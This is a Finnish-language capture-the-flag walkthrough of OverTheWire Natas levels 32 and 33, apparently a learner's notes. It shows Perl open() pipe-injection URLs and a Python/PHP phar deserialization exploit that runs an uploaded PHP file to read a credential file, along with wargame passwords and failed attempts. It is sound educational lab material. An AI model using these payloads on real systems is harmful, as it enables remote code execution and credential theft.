Tässä natas32:ssa on sama idea kuin natas31-tasossa, mutta tässä on vähän paranneltu versio.

Mikä idea tässä oli?
Käytetään samaa Excel-taulukkoa – sisältö voi olla mitä tahansa, esim. pari satunnaista riviä, tekstiä tai kirjainta. Syötetään `curl`-komentoa, jolla testataan natas32:n URL:ia ja lähetetään se taulukko mukaan. URL:iin oletuksena tulee polku: `http://natas32.natas.labs.overthewire.org/index.pl?` - Tähän perään käytetään Linux-tyyppistä komentoa kuten `ls`, jotta nähdään hakemiston sisältö.


Tulostettuna näkyy hakemisto, ja sieltä löytyy tiedosto `getpassword`, jolla on `SUID`-bit (rws), eli se voidaan suorittaa root-oikeuksin. Tämän kautta haetaan **natas33-tason salasana**, joka sijaitsee binäärin kautta luettavassa tiedostossa.

Siksi tullaan syöttää tällainen URL parametrin injektio hyökkäys `http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|` + ja mukaan excel taulukko filu ja näin ollen saadaan se salasanansa.


```
<table class="sortable table table-hover table-striped"><tr><th>.:
</th></tr><tr><td>total 156
</td></tr><tr><td>drwxr-x--- 5 natas32 natas32  4096 Aug 15 13:06 bootstrap-3.3.6-dist
</td></tr><tr><td>-rwsrwx--- 1 root    natas32 16096 Aug 15 13:06 getpassword
</td></tr><tr><td>-rw-r--r-- 1 root    root     9740 Aug 15 13:06 index-source.html
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32  2968 Aug 15 13:06 index.pl
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 97180 Aug 15 13:06 jquery-1.12.3.min.js
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 16877 Aug 15 13:06 sorttable.js
</td></tr><tr><td>drwxr-x--- 2 natas32 natas32  4096 Sep 14 13:03 tmp
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>

```

## miniyhteenveto - 2

Koskien tätä natas32 tehtävää ja harjoitusta. Tässä natas32 tapahtuu periaatteessa sama ideana kuin natas31:ssä, mutta vain curl komennolla ja/tai käyttää kali linux **burp suite** ohjelma/työkalulla ja käyttäen sitä POST URL:in parametri menetelmää ja mukaan lukien **ARGV** kontekstiin, jota käytetään Perl-ohjelmissa komentoriviparametrien välittämiseen.


Taustalla oleva Perl-skripti käyttää `open()`-funktiota lukemaan tiedostoja, mutta se lukee @ARGV-listan kautta eli komentorivillä annetuista parametreista.

- Tätä voidaan kuin "huijata" järjestelmää syöttämällä oman "tiedostolistamme" ARGV:n kautta – eli käytännössä lähettämällä POST-pyynnössä ylimääräisen tiedoston uusiksi.

**Burp suite** ohjelman alla tai curl koemnnolla lähetettään POST-pyyntöä osoitteeseen url perässä kuin `/index.pl` URL loppuun lisäämällä parametrin ja tämä on esim.

```
/index.pl?ls%20.|

```

Tämä toimii vain jos koko syöte osuu siihen `open()`-kutsuun, eli ensimmäinen tiedosto käytännössä kertoo mitä komentoa suoritetaan.

Muuta poikkeamia mietittykin mm.
- jos testaisi normaalisti URL sivuston kautta niin se ei pelittäisi koska tarvittaan virallinen excel taulukko ja suorittaa POST pyyntö samanaikaisesti.
- Entä jos F12 kautta developer tool työkalujen kautta suorittaa POST pyynnön, jossa lähetäisi tiedoston eli excel talukonsa? 
   - vastaus: ei, ei kunnolla koska tämä tapahtuisi uusi **multipart/form-data** POST-pyynnöllä ja jossa kuuluu tiedostoliite eli excel taulukko tiedosto.
   - F12:sta voi vain katsoa ja toistaa jo tehtyjä pyyntöjä, mutta ei luoda uusia "liitä tämä tiedosto mukaan" -tyylisiä pyyntöjä.


## linkejä ja apua ja teorioita

https://www.youtube.com/watch?v=KirvNW1FlNo


https://anyafachri.medium.com/perl-ultimate-vulnerability-in-cgi-opening-pipes-part-ii-natas32-overthewire-write-up-b3cdf6efe220


https://miaxu-src.github.io/natas/2021/09/19/natas32-walkthrough.html


---

# natas 33 - START HERE;

natas33 - 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ


Natas33 perus tietojen upottaminen ja näyttävän on kyseessä joku **Firmware** (Suom. laiteohjelmisto) tiedosto upottaminen - etusivun mukaan.

- Kokeiltu upottaa esim. screenshot kuvakaappaus - ainakin toi *md5_file* jotakin error tai joku error ilmoitus *There was an error uploading the file, please try again!* 
- yritin upottaa jopa excel taulukon, että antoi pientä vinkkiä ja error ilmoituksensa: */natas33/upload/g8q7ck7a506hbt8j0pvn2oqe7m Firmware upgrad initialised.* 
- jos upotan suurempaa dataa


## view-source ja teoriat

Tästä view-source html koodattu tästä vähä lisätietoa.


Tämä on koodattu PHP-koodikielellä alkuun käytett class (luokka) muotoa ja allekirjoitus mikälie onkaan voiko olla jotakin satunnaista tekstiä. 

```
class Executor{
                private $filename=""; 
                private $signature='adeafbadbabec0dedabada55ba55d00d';
                private $init=False;
```

Tässä tapahtuu tiedoston upottaminen, että mahdollinen maksimi on **4096 bittiä (bytes)** ja jos on yli siitä niin kertoo kyseinen tiedosto on liian iso ja sama pätee se skannaa sen tiedoston jotta täsmentyy firmware laiteohjelmistoa. Jos tiedosto ei päde siihen polkuun eli tiedoston upottamiseen se kertoo kyseinen tiedostossa on error tai on väärin.

```
function __construct(){
                    $this->filename=$_POST["filename"];
                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
                        echo "File is too big<br>";
                    }
                    else {
                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                            echo "Firmware upgrad initialised.<br>";
                        }
                        else{
                            echo "There was an error uploading the file, please try again!<br>";
                        }
                    }
                }
```

Tässä funktiossa sitten jos löytää mahdollisen niin se suorittaa sen tiedoston ja runnaa sen ja jos täsmentyy kemiat yhteen.

```
function __destruct(){
                    // upgrade firmware at the end of this script

                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                    chdir("/natas33/upload/");
                    if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
                }
```

Loppu osassa siinä on mainittu tämä `echo session_id()` - evästeen ID:tä, joka tarkoittaa tiedoston upotaessa se vastaavan natas33:sen eväste PHPSESSID:tä.
```
            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="<?php echo session_id(); ?>" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
```



**eli mikä idea**
- Luoda alle 4KB:n php tiedosto, jonka sisältö tuottaa täsmälleen tuodun **md5-summan** ja tämä tiedosto lähettää palvelimelle suorittakseen tiedoston ja tulostaa salasanan seuraavaan tasoon.

- Ongelmia ehdottomasti löytyy, joka on MD5-tiiviste joka on **yksisuuntainen tiivistefunktio**.


Tässä if-else lausessa on koskien **md5_file** funktiota, jos tulos on yhtä suuri kuin `adeafbadbabec0dedabada55ba55d00d` signature-arvo niin tiedosto suoritetaan. Jos ei, tiedosto suoriteaan virheilmoituksia ja toiminto epäonnistuu. 
```
if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
```


## hyökkäysmentelmä

Tässä natas33 tasossa tapahtuu siis **Phar deserialization attack** menetelmä. **Phar-hyökkäys** tarkoittaa, että hyökkääjä luo valetiedoston (Phar-arkisto), **joka sisältää piilotettua PHP-koodia** tai olioita, jotka suoritetaan vahingossa, kun palvelin avaa tiedoston jollain viattomalla funktiolla, kuten `md5_file()`.

Tämä on pieni vaiheittainen steppi se hyökkäys, mitä siinä Phar tiedoston alla voi olla siis:
- erityisiä metadataa (piilotietoa)
- metadatan tähän sisältää PHP-ohjelmointikieltä tehtyjä olioita


Tiivistettynä ja helppo ymmärtää hyökkäys menetelmänsä: 
- Phar deserialization attack on tapa piilottaa haitallista ohjelmakoodia tiedoston sisään niin, että palvelin suorittaa sen vahingossa, kun se yrittää vain "katsoa" tiedostoa — kuten laskiessaan sen MD5-tiivistettä.
- Phar deserialization attack perustuu siihen, että PHP lukee ja suorittaa metadatassa olevan PHP-olion. Ei esim. Python-objektia tai JSON-dataa tai mitään muuta.
- Phar voi sisältää mitä tahansa tiedostoja, mutta haitallinen metadata täytyy olla PHP-olion serialisoitu muoto, koska hyökkäys perustuu PHP:n `unserialize()`-toimintoon.


## kali linux - start here

natas33 - 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ


```
┌──(kali㉿kali)-[~]
└─$ curl http://natas33.natas.labs.overthewire.org/ --user natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

                        <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="5tp8uotc0g5fshm68rl63cmq0e" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>

┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://nata34.natas.labs.overthewire.org/" http://natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ@natas33.natas.labs.overthewire.org
<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

                        <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="2bd5nam2nsc91b57lv4mu9gveg" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```


## muita testejä

- url perään laitettu `/file/` & `/robots.txt` ja sama pätee linux tiedosto menetelmä `/etc/natas_webpass/natas34` - ei tuo mitään eli "Not Found"
- avattu F12 (application) polku, josta toi tämä "no service workers found" eli ei löydeätty evästeittä.


## solution ratkaisu vaihtoehtoja

Eli ratkaisuna on luoda PHP kaltainen tiedosto, mikä tästä on tehty kuin aikaisempi, muttak uitenkin toisenlainen PHP serialisoinnin poisto-/serialisoinnin poistohyökkäys), meidän on luotava PHP-objekti, jota käytetään hyökkäyksessä. Näitä ratkaisuja on tosi paljon, mutta kokeillaan ja testatan vaihtoehtoja, että näitä ei ole oikeata tai väärää ratkaisua kunhan päästään ja saadaan seuraave natas34 tason salasana.

### python metodi

Tämä python koodi ideana on lukea URL natas33 tason sivustoa, että perus autentikointina salasanaa, että päästäkseen Linux tiedosto ja siihen URL polkuun, että löytää natas34 tasonsa olemassa. Kuitenkin ideana on suorittaa tämä POST tiedoston upottaminen, että täsmentyvä tiedoston koko eli 4096 bittiä.

Tuossa yhdessä python koodi rivissä lukeekin, että se pitää avata "natas33.php.template" yksi php koodi pätkä - josta toimii kuin upottaisi tiedostonsa natas33 tason alle.

python koodi:

```
import requests
import hashlib
import subprocess

url = 'http://natas33.natas.labs.overthewire.org/'

auth = ('natas33', '2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ')

content = b'<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>'
content_hash = hashlib.md5(content).hexdigest()
filename = 'rce.php'

with open('natas33.php.template', 'r') as template:
    with open('natas33.php', 'w') as o:
        o.write(template.read().format(filename, content_hash))

output = subprocess.check_output(['php', '-d', 'phar.readonly=false', 'natas33.php'])

# Upload your rce script and overwrite the filename field to have the file accesible for the next step.
requests.post(url + '/index.php', auth=auth,
              data={'filename': filename, 'submit': 'Upload File'},
              files={'uploadedfile': content})

# Upload the generated phar file but instead of giving a file name, use the protocol handler.
response = requests.post(url + '/index.php', auth=auth, data={'filename': 'phar://test.phar/test.txt', 'submit': 'Upload File'}, files={'uploadedfile': open('test.phar', 'rb')})
print(response.text)
```

php koodi ja tarkennuksensa se pitää lukea se tiedosto, että kantsii nimettä kokonaisena "natas33.php.template":

```
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');
class Executor{{
  private $filename='{}';
  private $signature='{}';
}}
$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();
?>
```

jotakin ainakin tapahtui, mutta toi pientä erroria??
```
┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ python natas33.py 
<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            <br />
<b>Warning</b>:  move_uploaded_file(/natas33/upload/phar://test.phar/test.txt): failed to open stream: No such file or directory in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move '/var/lib/php/uploadtmp/phpZt2JUM' to '/natas33/upload/phar://test.phar/test.txt' in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
There was an error uploading the file, please try again!<br><br />
<b>Warning</b>:  md5_file(phar://test.phar/test.txt): failed to open stream: phar error: invalid url or non-existent phar &quot;phar://test.phar/test.txt&quot; in <b>/var/www/natas/natas33/index.php</b> on line <b>42</b><br />
Failur! MD5sum mismatch!<br>            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="vescnaasuvlkdh897t6i4ighnk" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

vescnaasuvlkdh897t6i4ighnk - tämä ei ole ainakaan salasana, ja se on upotettavan tiedoston vastaava PHPSESSID.

```
┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ ls
natas33.php  natas33.php.template  natas33.py  test.phar
                                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ cat test.phar 
<?php __HALT_COMPILER(); ?>
�~O:8:"Executor":2:{s:18:"Executorfilename";s:7:"rce.php";s:19:"Executorsignature";s:32:"8a54d751b7e2bbbb2643d355d49e81be";test.txtǧ�;�textFU��L�U'O'SK�}���%�},����r���GBMB                                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ cat natas33.php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');
class Executor{
  private $filename='rce.php';
  private $signature='8a54d751b7e2bbbb2643d355d49e81be';
}
$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();
?>

```

Tämä tässä nyt "  private $signature='8a54d751b7e2bbbb2643d355d49e81be';" ei täsmeny Natas33 sivuston index-source koodi ppätkäänsä..

## testit jatkuu


tästä ainakin upotettu tiedosto tuohon sivustonsa, että saattiinko oikea vastausta ja testattu (EI OLE) - matka jatkuu. Eli tosiaan upotettu php templates tiedosto, mutta se ei toiminut ja sama pätee python koodi ,ettei tulosta antanutkaan.
```
The update has been uploaded to: /natas33/upload/497a7spfs5a8vkq8ivujkrr6be
Firmware upgrad initialised.
Failur! MD5sum mismatch!
Upload Firmware Update:
```

Tässä koodi pätkässä kuitenkin pitää saada tai tuo jotakin tiedostojen upottamista polkuunsa, että hakee tämän tiedoston nimikkeen.. 

```
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                            echo "Firmware upgrad initialised.<br>";
                        }
```

mutta jos `md5_file()` täsmentyy tuohon tiedoston `$signature` objektii mikälie niin pitäisi tulla tämä täsmentyvä tekijä eli >> private $signature='adeafbadbabec0dedabada55ba55d00d';

```
// "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                    chdir("/natas33/upload/");
                    if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
```


yritin uudestaan ajaa tämä python koodi, että ainakin näyttävän toi PHPSESSID on vain eri eli (`dppl5h4d7tctrnim84cb5cip4k`), mutta taas luettua php koodi pätkä että signature tämä koodi (8a54d751b7e2bbbb2643d355d49e81be) verrattuna aikaisempaan on sama.

```
┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ python natas33.py
<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            <br />
<b>Warning</b>:  move_uploaded_file(/natas33/upload/phar://test.phar/test.txt): failed to open stream: No such file or directory in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move '/var/lib/php/uploadtmp/phpjKa1pH' to '/natas33/upload/phar://test.phar/test.txt' in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
There was an error uploading the file, please try again!<br><br />
<b>Warning</b>:  md5_file(phar://test.phar/test.txt): failed to open stream: phar error: invalid url or non-existent phar &quot;phar://test.phar/test.txt&quot; in <b>/var/www/natas/natas33/index.php</b> on line <b>42</b><br />
Failur! MD5sum mismatch!<br>            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="dppl5h4d7tctrnim84cb5cip4k" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>


┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ cat natas33.php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');
class Executor{
  private $filename='rce.php';
  private $signature='8a54d751b7e2bbbb2643d355d49e81be';
}
$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();
?>
```

## burp suite

Tämä on burpsuite on päivittynyt tosi paljon, jos vertailee aikaisempia toisten ratkaisempia burp suite ohjeiden mukaan voi olla saa ratkaistettua mutta vie paljon aikaa ja ongelmanratkaisuun.. (kokeillaan toinen kerta), mutta tästä lisätty kuvia ja siinä alla on oma AI jopa.

yksi niistä ratkaistettu ja suoritettu , että toimi mutta seurattu ohjeiden mukaan: https://learnhacking.io/overthewire-natas-level-33-walkthrough/




natas34 - j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY



## linkejä ja apua ja teorioita

https://learnhacking.io/overthewire-natas-level-33-walkthrough/

https://thomaspreece.com/2020/08/21/overthewire-natas/
https://axcheron.github.io/writeups/otw/natas/#natas-33-solution

https://blog.certcube.com/overthewire-natas/
https://blog.sudarshandevkota.com.np/overthewire-natas-walkthrough

https://lioxliu.wordpress.com/2021/01/09/overthewire-natas-level-33/

https://medium.com/@arnavaidya/overthewire-wargames-natas-level-32-33-walkthrough-15696c5d60b2

---